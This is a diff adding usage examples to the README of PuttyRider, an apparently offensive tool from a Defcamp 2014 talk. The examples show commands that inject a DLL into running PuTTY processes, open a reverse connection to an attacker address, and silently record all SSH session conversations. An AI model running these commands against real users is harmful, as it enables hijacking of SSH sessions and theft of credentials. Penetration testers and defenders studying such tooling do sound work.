@@ -12,7 +12,21 @@ Documentation
 * [Defcamp 2014 presentation - pdf](http://defcamp.ro/dc14/AdrianFurtuna.pdf)
 * [Defcamp 2014 presentation - video](https://www.youtube.com/watch?v=nfhzoFPGUhg&list=UUc05xgnkf4YZEdn3zBJRFkA)
 
+Examples
+========
+List existing Putty processes and their status (injected / not injected)
+    PuttyRider.exe -l
 
+Inject DLL into the first found putty.exe and initiate a reverse connection from DLL to my IP:Port, then exit PuttyRider.exe.
+    PuttyRider.exe -p 0 -r 192.168.0.55:8080
+
+Run in background and wait for new Putty processes. Inject in any new putty.exe and write all conversations in local files. 
+    PuttyRider.exe -w -f
+
+Eject PuttyRider.dll from all Putty processes where it is already injected. 
+(Don't forget to kill PuttyRider.exe if running in -w mode, otherwise it will reinject again.)
+    PuttyRider.exe -x
+    
 Usage
 =====
 	Operation modes:
